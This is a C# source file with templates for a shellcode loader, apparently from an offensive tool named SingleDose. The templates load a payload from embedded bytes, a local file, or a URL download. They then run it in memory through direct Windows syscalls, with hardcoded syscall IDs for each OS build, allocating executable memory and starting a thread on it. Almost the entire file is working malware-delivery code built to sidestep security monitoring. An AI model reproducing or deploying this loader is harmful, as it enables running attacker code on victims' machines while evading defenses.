namespace SingleDose
{
    class SYSCALL_CT
    {

        public static string STATIC = @"
            System.Collections.Generic.List<byte> payloadList = new System.Collections.Generic.List<byte> { {{SHELLCODE}} };
            byte[] payload = payloadList.ToArray();
            ";
        public static string DYNAMIC_ARGPARSE = @"
        public class ArgValues
        {
            public string binPath;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-BIN"") && arguments[i + 1] != null)
                    {
                        if (System.IO.File.Exists(arguments[i + 1]))
                        {
                            collection.binPath = arguments[i + 1];
                        }
                        else if (!System.IO.File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid bin path supplied."");
                            return null;
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }

            return collection;
        }
";
        public static string DYNAMIC= @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)){
                Console.WriteLine(""-Bin: Path to shellcode"");
                Environment.Exit(0);
            }
            ArgValues parsedArgs = ArgParse(args);
            byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);
";
        public static string DOWNLOAD_ARGPARSE = @"
        public class ArgValues
        {
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        collection.DownloadURI = arguments[i + 1];
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }
            return collection;
        }";
        public static string DOWNLOAD = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase)){
                Console.WriteLine(""-URI: URI to download"");
                Environment.Exit(0);
            }

            ArgValues parsedArgs = ArgParse(args);
            System.Net.WebClient wc = new System.Net.WebClient();
            byte[] payload;
            payload = wc.DownloadData(parsedArgs.DownloadURI);";

        public static string BODY = @"
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    partial class Program
    {
        static void Main(string[] args)
        {
            {{TRIGGER}}
            {{MODE}}
         
            var SyscallResults = FetchSyscallID();
            IntPtr hCurrentProcess = GetCurrentProcess();
            IntPtr pMemoryAllocation = new IntPtr();
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length));
            uint allocationType = (uint)AllocationType.Commit | (uint)AllocationType.Reserve;
            uint protection = (uint)AllocationProtect.PAGE_EXECUTE_READWRITE;

            try
            {
                NtAllocateVirtualMemory(SyscallResults.NtAllocateVirtualMemoryID, hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
            }
            catch
            {
                Console.WriteLine(""[*] NtAllocateVirtualMemory failed."");
                Environment.Exit(1);
            }

            try
            {
                Marshal.Copy(payload, 0, (IntPtr)(pMemoryAllocation), payload.Length);
            }
            catch
            {
                Console.WriteLine(""[*] Marshal.Copy failed!"");
                Environment.Exit(1);
            }

            IntPtr hThread = new IntPtr(0);
            ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL;
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            uint stackZeroBits = 0;
            uint sizeOfStackCommit = 0xFFFF;
            uint sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);

            try
            {
                NtCreateThreadEx(SyscallResults.NtCreateThreadExID, out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
            }
            catch
            {
                Console.WriteLine(""[*] NtCreateThread failed."");
                Environment.Exit(1);
            }

            uint old;
            if (!VirtualProtectEx(hCurrentProcess, pMemoryAllocation, (UIntPtr)payload.Length, (uint)AllocationProtect.PAGE_EXECUTE_READ, out old)) //Change back to RX instead of RWX
            {
                Console.WriteLine(""[!] Error changing page protections from PAGE_EXECUTE_READWRITE to PAGE_EXECUTE_READ."");
            }

            try
            {
                NtWaitForSingleObject(SyscallResults.NtWaitForSingleObjectID, hThread, true, 0);
            }
            catch
            {
                Console.WriteLine(""[*] NtWaitForSingleObject failed."");
                Environment.Exit(1);
            }
            return;
        }

        {{ARGS}}

        public class SyscallIDResults
        {
            public string OSBuild;
            public byte NtAllocateVirtualMemoryID;
            public byte NtCreateThreadExID;
            public byte NtWaitForSingleObjectID;
        }

        public static SyscallIDResults FetchSyscallID()
        {

            SyscallIDResults syscallResults = new SyscallIDResults();

            try
            {

                ManagementObjectSearcher searcher = new ManagementObjectSearcher(""root\\CIMV2"", ""SELECT BuildNumber FROM Win32_OperatingSystem"");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    syscallResults.OSBuild = queryObj[""BuildNumber""].ToString();
                }

            }
            catch (ManagementException e)
            {
                Console.WriteLine(""An error occurred while querying for WMI for BuildNumber: "" + e.Message);
            }

            if (syscallResults.OSBuild != """")
            {
                switch (syscallResults.OSBuild)
                {
                    //Windows 10 Builds//
                    case ""1507"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xb3;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""1511"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xb4;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""1607"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xb6;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""1703"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xb9;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""1709"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xba;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""1803"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xbb;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""1809"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xbc;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""1903"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xbd;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""1909"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xbd;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""2004"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xc1;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""20H2"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xc1;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""14393"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xb6;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""18362"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xbd;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    case ""19043"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x18;
                        syscallResults.NtCreateThreadExID = 0xc1;
                        syscallResults.NtWaitForSingleObjectID = 0x04;
                        break;
                    // Windows Server 2012 //
                    case ""SP0"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x16;
                        syscallResults.NtCreateThreadExID = 0xaf;
                        syscallResults.NtWaitForSingleObjectID = 0x02;
                        break;
                    case ""R2"":
                        syscallResults.NtAllocateVirtualMemoryID = 0x17;
                        syscallResults.NtCreateThreadExID = 0xb0;
                        syscallResults.NtWaitForSingleObjectID = 0x03;
                        break;
                    default:
                        Console.WriteLine(""[!] Build unsupported"");
                        Environment.Exit(0);
                        break; //Errors if I don't put this here. ""cOnTroL cAnNoT FalLouT...""
                }
            }
            else
            {
                Console.WriteLine(""[!] Unable to fetch build number via WMI. Exiting..."");
                Environment.Exit(0);
            }
            return syscallResults;
        }
        public static NTSTATUS NtAllocateVirtualMemory(
            byte syscallId,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref UIntPtr RegionSize,
            uint AllocationType,
            uint Protect)
        {
            byte[] bNtAllocateVirtualMemory =
            {
            0x4c, 0x8b, 0xd1,                    // mov r10,rcx
            0xb8, syscallId, 0x00, 0x00, 0x00,   // mov eax,SyscallId
            0x0F, 0x05,                          // syscall
            0xC3                                 // ret
            };

            byte[] syscall = bNtAllocateVirtualMemory;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;
                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, Protect, out oldprotect))
                    {
                        throw new Win32Exception();
                    }
                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));
                    return (NTSTATUS)assembledFunction(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
                }
            }
        }


        public static NTSTATUS NtCreateThreadEx(
            byte syscallId,
            out IntPtr hThread,
            ACCESS_MASK DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBytesBuffer
            )
        {
            byte[] bNtCreateThreadEx =
            {
            0x4c, 0x8b, 0xd1,                    // mov r10,rcx
            0xb8, syscallId, 0x00, 0x00, 0x00,   // mov eax, SyscallId
            0x0F, 0x05,                          // syscall
            0xC3                                 // ret
            };
            byte[] syscall = bNtCreateThreadEx;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;
                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out oldprotect))
                    {
                        throw new Win32Exception();
                    }
                    Delegates.NtCreateThreadEx assembledFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));
                    return (NTSTATUS)assembledFunction(out hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
                }
            }
        }

        public static NTSTATUS NtWaitForSingleObject(byte syscallId, IntPtr Object, bool Alertable, uint Timeout)
        {
            byte[] bNtWaitForSingleObject =
            {
            0x4c, 0x8b, 0xd1,                    // mov r10,rcx
            0xb8, syscallId, 0x00, 0x00, 0x00,   // mov eax, syscallId
            0x0F, 0x05,                          // syscall
            0xC3                                 // ret
            };

            byte[] syscall = bNtWaitForSingleObject;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;
                    uint oldprotect;
                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));
                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);
                }
            }
        }
        public struct Delegates
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NTSTATUS NtCreateThreadEx(out IntPtr hThread, ACCESS_MASK DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);
        }

        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,
            MaximumNtStatus = 0xffffffff
        }

        // NtAllocateVirtualMemory - ULONG AllocationType
        [Flags]
        public enum AllocationType : ulong
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        // NtCreateThread - ACCESS_MASK DesiredAccess
        [Flags]
        public enum ACCESS_MASK : uint
        {
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
        }

        // NtCreateThread - POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        // NtCreateThread - POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL
        public struct OBJECT_ATTRIBUTES : IDisposable
        {
            public int Length;
            public IntPtr RootDirectory;
            private IntPtr objectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public OBJECT_ATTRIBUTES(string name, uint attrs)
            {
                Length = 0;
                RootDirectory = IntPtr.Zero;
                objectName = IntPtr.Zero;
                Attributes = attrs;
                SecurityDescriptor = IntPtr.Zero;
                SecurityQualityOfService = IntPtr.Zero;

                Length = Marshal.SizeOf(this);
                ObjectName = new UNICODE_STRING(name);
            }

            public UNICODE_STRING ObjectName
            {
                get
                {
                    return (UNICODE_STRING)Marshal.PtrToStructure(
                     objectName, typeof(UNICODE_STRING));
                }

                set
                {
                    bool fDeleteOld = objectName != IntPtr.Zero;
                    if (!fDeleteOld)
                        objectName = Marshal.AllocHGlobal(Marshal.SizeOf(value));
                    Marshal.StructureToPtr(value, objectName, fDeleteOld);
                }
            }

            public void Dispose()
            {
                if (objectName != IntPtr.Zero)
                {
                    Marshal.DestroyStructure(objectName, typeof(UNICODE_STRING));
                    Marshal.FreeHGlobal(objectName);
                    objectName = IntPtr.Zero;
                }
            }
        }

        // For making memory RX
        [DllImport(""kernel32.dll"")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // For making memory RX
        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        // For getting a handle to the current process
        [DllImport(""kernel32.dll"", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();
    }
}";

    }
}
